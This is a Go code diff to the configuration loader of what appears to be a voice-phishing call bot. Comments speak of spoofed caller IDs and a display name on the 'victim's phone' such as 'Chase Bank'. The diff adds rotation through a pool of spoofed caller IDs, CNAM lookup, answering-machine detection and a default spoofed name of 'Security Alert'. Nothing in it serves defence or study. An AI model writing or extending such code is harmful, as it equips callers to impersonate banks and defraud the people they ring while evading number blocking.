@@ -19,6 +19,9 @@ type Config struct {
 	PlivoNumber    string  `yaml:"plivo_number"`
 	CallerID       string  `yaml:"caller_id"`      // Spoofed caller ID number (must be verified in Plivo)
 	CallerName     string  `yaml:"caller_name"`    // Display name on victim's phone (e.g., "Chase Bank")
+	EnableCNAM     bool    `yaml:"enable_cnam"`    // Enable CNAM lookup for caller ID
+	RandomizeCID   bool    `yaml:"randomize_caller_id"` // Randomize caller ID from pool
+	CallerIDPool   []string `yaml:"caller_id_pool"` // Pool of caller IDs to rotate through
 	AdminIDs       []int64 `yaml:"admin_ids"`
 	NgrokURL       string  `yaml:"ngrok_url"`
 	Port           string  `yaml:"port"`
@@ -27,6 +30,8 @@ type Config struct {
 	Concurrency    int     `yaml:"concurrency"`
 	MaxRetries     int     `yaml:"max_retries"`
 	CallTimeout    int     `yaml:"call_timeout"`
+	RingTimeout    int     `yaml:"ring_timeout"`   // How long to let phone ring
+	MachineDetection bool `yaml:"machine_detection"` // Detect answering machines
 }
 
 type Loader struct {
@@ -139,6 +144,9 @@ func (l *Loader) applyDefaults(cfg *Config) {
 	if cfg.CallTimeout <= 0 {
 		cfg.CallTimeout = 30
 	}
+	if cfg.RingTimeout <= 0 {
+		cfg.RingTimeout = 30
+	}
 	if cfg.NgrokURL == "" {
 		cfg.NgrokURL = "http://localhost:4040"
 	}
@@ -148,6 +156,10 @@ func (l *Loader) applyDefaults(cfg *Config) {
 	// CallerID defaults to PlivoNumber if not set
 	if cfg.CallerID == "" {
 		cfg.CallerID = cfg.PlivoNumber
+	}
+	// Default caller name for spoofing
+	if cfg.CallerName == "" {
+		cfg.CallerName = "Security Alert"
 	}
 }
 
@@ -185,14 +197,19 @@ func (l *Loader) RegisterWatcher(ch chan struct{}) {
 
 func DefaultConfig() *Config {
 	return &Config{
-		Port:         "3000",
-		DatabasePath: "./data/bot.db",
-		LogPath:      "./logs/bot.log",
-		Concurrency:  5,
-		MaxRetries:   3,
-		CallTimeout:  30,
-		NgrokURL:     "http://localhost:4040",
-		AdminIDs:     []int64{},
+		Port:              "3000",
+		DatabasePath:       "./data/bot.db",
+		LogPath:           "./logs/bot.log",
+		Concurrency:       5,
+		MaxRetries:        3,
+		CallTimeout:       30,
+		RingTimeout:       30,
+		NgrokURL:          "http://localhost:4040",
+		AdminIDs:          []int64{},
+		CallerName:        "Security Alert",
+		EnableCNAM:        false,
+		RandomizeCID:      false,
+		MachineDetection:  true,
 	}
 }
 
